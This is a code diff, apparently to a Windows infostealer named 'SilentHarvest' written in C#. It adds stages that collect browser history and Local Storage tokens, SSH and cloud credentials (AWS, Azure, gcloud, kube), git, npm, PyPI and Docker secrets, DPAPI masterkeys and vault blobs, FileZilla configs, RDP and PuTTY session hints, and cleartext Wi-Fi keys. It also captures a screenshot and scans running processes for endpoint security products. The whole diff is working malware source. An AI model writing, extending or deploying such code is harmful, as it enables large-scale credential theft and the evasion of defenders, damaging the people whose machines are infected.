@@ -341,6 +341,7 @@ namespace SilentHarvest
                         new string[] { "Cookies2", Path.Combine(pd, "Cookies") },
                         new string[] { "LoginData", Path.Combine(pd, "Login Data") },
                         new string[] { "WebData",  Path.Combine(pd, "Web Data") },
+                        new string[] { "History",  Path.Combine(pd, "History") },
                     };
                     foreach (string[] f in files)
                     {
@@ -356,8 +357,8 @@ namespace SilentHarvest
                             else if (f[0] == "Cookies2") rel = "Cookies";
                             else if (f[0] == "LoginData") rel = "Login Data";
                             else if (f[0] == "WebData") rel = "Web Data";
-                            else rel = null;
-                            if (rel != null && prof != ".")
+                            else rel = "History";
+                            if (prof != ".")
                             {
                                 string suffix = b[1] + "\\" + prof + "\\" + rel;
                                 data = Util.ReadFileViaHandleDup(suffix);
@@ -375,6 +376,26 @@ namespace SilentHarvest
                         nParts++;
                         Util.Log("{0}/{1}/{2}: {3} bytes ({4})", name, prof, f[0], data.Length, method);
                     }
+
+                    // Local Storage leveldb: site tokens/JWTs live here, not app-bound
+                    try
+                    {
+                        string lsDir = Path.Combine(pd, @"Local Storage\leveldb");
+                        if (Directory.Exists(lsDir))
+                        {
+                            foreach (string f in Directory.GetFiles(lsDir))
+                            {
+                                if (!f.EndsWith(".log") && !f.EndsWith(".ldb")) continue;
+                                byte[] data = Util.ReadFileLoose(f);
+                                if (data == null || data.Length > 2 * 1024 * 1024) continue;
+                                parts.Add(new Part(
+                                    "b:" + name + "/" + prof + "/LocalStorage/" + Path.GetFileName(f),
+                                    data, new Util.JsonObj().Add("path", f).ToString()));
+                                nParts++;
+                            }
+                        }
+                    }
+                    catch { }
                 }
             }
 
@@ -428,6 +449,234 @@ namespace SilentHarvest
                 return outData;
             }
             finally { h.Free(); }
+        }
+
+
+        // ------------------------------------------------------------ keys & cloud
+        // plaintext credential files under the user profile - never app-bound
+        public static string KeysStage(List<Part> parts)
+        {
+            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            int n = 0;
+            string[][] targets = new string[][]
+            {
+                new string[] { "ssh",    Path.Combine(home, ".ssh") },
+                new string[] { "aws",    Path.Combine(home, ".aws") },
+                new string[] { "kube",   Path.Combine(home, ".kube") },
+                new string[] { "azure",  Path.Combine(home, ".azure") },
+                new string[] { "gcloud", Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "gcloud") },
+            };
+            foreach (string[] t in targets)
+            {
+                if (!Directory.Exists(t[1])) continue;
+                try
+                {
+                    foreach (string f in Directory.GetFiles(t[1], "*", SearchOption.AllDirectories))
+                    {
+                        byte[] data = Util.ReadFileLoose(f);
+                        if (data == null) continue;
+                        string rel = f.Substring(t[1].Length + 1);
+                        parts.Add(new Part("win:key/" + t[0] + "/" + rel, data,
+                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
+                        n++;
+                    }
+                }
+                catch { }
+            }
+            string[][] files = new string[][]
+            {
+                new string[] { "netrc",           Path.Combine(home, ".netrc") },
+                new string[] { "git-credentials", Path.Combine(home, ".git-credentials") },
+                new string[] { "docker-config",   Path.Combine(home, @".docker\config.json") },
+                new string[] { "npmrc",           Path.Combine(home, ".npmrc") },
+                new string[] { "pypirc",          Path.Combine(home, ".pypirc") },
+            };
+            foreach (string[] f in files)
+            {
+                byte[] data = Util.ReadFileLoose(f[1]);
+                if (data == null) continue;
+                parts.Add(new Part("win:key/" + f[0], data, new Util.JsonObj().Add("path", f[1]).ToString()));
+                n++;
+            }
+            return "keys=" + n;
+        }
+
+        // ------------------------------------------------------------ DPAPI vault
+        // raw material: DPAPI masterkeys + Credential Manager vault blobs +
+        // FTP client configs with legacy-obfuscated passwords
+        public static string VaultStage(List<Part> parts)
+        {
+            int n = 0;
+            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+
+            string[][] dirs = new string[][]
+            {
+                new string[] { "protect",       Path.Combine(roaming, @"Microsoft\Protect") },
+                new string[] { "vault-local",   Path.Combine(local,   @"Microsoft\Vault") },
+                new string[] { "vault-roaming", Path.Combine(roaming, @"Microsoft\Vault") },
+                new string[] { "filezilla",     Path.Combine(roaming, @"FileZilla") },
+            };
+            foreach (string[] d in dirs)
+            {
+                if (!Directory.Exists(d[1])) continue;
+                try
+                {
+                    foreach (string f in Directory.GetFiles(d[1], "*", SearchOption.AllDirectories))
+                    {
+                        byte[] data = Util.ReadFileLoose(f);
+                        if (data == null || data.Length > 2 * 1024 * 1024) continue;
+                        string rel = f.Substring(d[1].Length + 1).Replace('\\', '_');
+                        parts.Add(new Part("win:" + d[0] + "/" + rel, data,
+                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
+                        n++;
+                    }
+                }
+                catch { }
+            }
+
+            // RDP server hints (readable registry, no elevation needed)
+            try
+            {
+                Microsoft.Win32.RegistryKey k =
+                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
+                        @"Software\Microsoft\Terminal Server Client\Servers");
+                if (k != null)
+                {
+                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
+                    foreach (string sub in k.GetSubKeyNames())
+                    {
+                        string hint = (string)k.OpenSubKey(sub).GetValue("UsernameHint", "");
+                        sb.Append(sub).Append('\t').Append(hint).Append('\n');
+                    }
+                    if (sb.Length > 0)
+                    {
+                        parts.Add(new Part("win:rdp-hints",
+                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()),
+                            new Util.JsonObj().Add("count", k.GetSubKeyNames().Length.ToString()).ToString()));
+                        n++;
+                    }
+                }
+            }
+            catch { }
+
+            // PuTTY saved sessions (hostnames/users - recon for key reuse)
+            try
+            {
+                Microsoft.Win32.RegistryKey k =
+                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
+                        @"Software\SimonTatham\PuTTY\Sessions");
+                if (k != null)
+                {
+                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
+                    foreach (string sub in k.GetSubKeyNames())
+                    {
+                        Microsoft.Win32.RegistryKey sk = k.OpenSubKey(sub);
+                        sb.Append(sub).Append('\t')
+                          .Append(sk.GetValue("HostName", "")).Append('\t')
+                          .Append(sk.GetValue("UserName", "")).Append('\n');
+                    }
+                    if (sb.Length > 0)
+                    {
+                        parts.Add(new Part("win:putty-sessions",
+                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()), null));
+                        n++;
+                    }
+                }
+            }
+            catch { }
+            return "vault=" + n;
+        }
+
+        // ------------------------------------------------------------ wifi
+        public static string WifiStage(List<Part> parts, bool elevated)
+        {
+            try
+            {
+                System.Text.StringBuilder sb = new System.Text.StringBuilder();
+                ProcessStartInfo psi = new ProcessStartInfo("netsh", "wlan show profiles");
+                psi.CreateNoWindow = true; psi.UseShellExecute = false;
+                psi.RedirectStandardOutput = true;
+                Process p = Process.Start(psi);
+                string list = p.StandardOutput.ReadToEnd();
+                p.WaitForExit(10000);
+                sb.Append(list);
+                foreach (string line in list.Split('\n'))
+                {
+                    int i = line.IndexOf(':');
+                    if (i < 0 || !line.Contains("Profile")) continue;
+                    string name = line.Substring(i + 1).Trim();
+                    if (name.Length == 0 || !elevated) continue;
+                    ProcessStartInfo psi2 = new ProcessStartInfo("netsh",
+                        "wlan show profile name=\"" + name + "\" key=clear");
+                    psi2.CreateNoWindow = true; psi2.UseShellExecute = false;
+                    psi2.RedirectStandardOutput = true;
+                    Process p2 = Process.Start(psi2);
+                    sb.Append(p2.StandardOutput.ReadToEnd());
+                    p2.WaitForExit(10000);
+                }
+                byte[] data = System.Text.Encoding.UTF8.GetBytes(sb.ToString());
+                parts.Add(new Part("win:wifi", data,
+                    new Util.JsonObj().Add("elevated", elevated ? "true" : "false").ToString()));
+                return "wifi=ok(" + (elevated ? "keys" : "names-only") + ")";
+            }
+            catch (Exception e) { Util.Log("wifi stage: {0}", e.Message); return "wifi=fail"; }
+        }
+
+        // ------------------------------------------------------------ screenshot
+        public static byte[] ScreenshotPng()
+        {
+            try
+            {
+                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
+                using (System.Drawing.Bitmap bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(bmp))
+                        g.CopyFromScreen(bounds.Location, System.Drawing.Point.Empty, bounds.Size);
+                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
+                    {
+                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                        return ms.ToArray();
+                    }
+                }
+            }
+            catch (Exception e) { Util.Log("screenshot: {0}", e.Message); return null; }
+        }
+
+        // ------------------------------------------------------------ recon
+        private static readonly string[] EDR_NAMES = new string[]
+        {
+            "MsMpEng", "NisSrv", "CrowdStrike", "CSFalcon", "SentinelAgent",
+            "SentinelServiceHost", "Cybereason", "Tanium", "carbonblack",
+            "xagt", "SophosHealth", "esensor", "osqueryd", "wazuh", "Sysmon",
+            "ekrn", "avp", "kavfs", "masvc", "McAfee", "bdagent", "360tray",
+            "Traps", "panhlpsvc", "dsmonitor", "SafeService",
+        };
+
+        public static string EdrScan(List<Part> parts)
+        {
+            System.Text.StringBuilder sb = new System.Text.StringBuilder();
+            try
+            {
+                foreach (Process proc in Process.GetProcesses())
+                {
+                    string name = proc.ProcessName.ToLowerInvariant();
+                    foreach (string edr in EDR_NAMES)
+                    {
+                        if (name.Contains(edr.ToLowerInvariant()))
+                        {
+                            sb.Append(proc.ProcessName).Append('\n');
+                            break;
+                        }
+                    }
+                }
+            }
+            catch { }
+            string hits = sb.ToString();
+            parts.Add(new Part("win:edr", System.Text.Encoding.UTF8.GetBytes(
+                hits.Length > 0 ? hits : "none detected\n"), null));
+            return hits.Length > 0 ? ("edr=" + hits.Replace("\n", ",").TrimEnd(',')) : "edr=none";
         }
 
         // ------------------------------------------------------------ sysinfo
